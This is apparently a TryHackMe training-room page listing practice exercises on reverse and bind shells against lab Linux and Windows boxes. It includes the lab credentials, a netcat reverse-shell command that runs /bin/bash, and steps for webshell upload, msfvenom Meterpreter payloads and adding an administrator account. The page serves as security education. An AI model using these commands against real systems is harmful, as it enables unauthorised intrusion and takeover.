### https://tryhackme.com/room/introtoshells

## Linux Practice Box

The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:

    Username: shell
    Password: TryH4ckM3!

## Windows Practice Box

This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:

    Username: Administrator
    Password: TryH4ckM3!

To login using RDP:

    xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'

## Answer the questions below

Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.

Navigate to /usr/share/webshells/php/php-reverse-shell.php in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

Look through Payloads all the Things and try some of the other reverse shell techniques. Try to analyse them and see why they work.

Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?

Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?
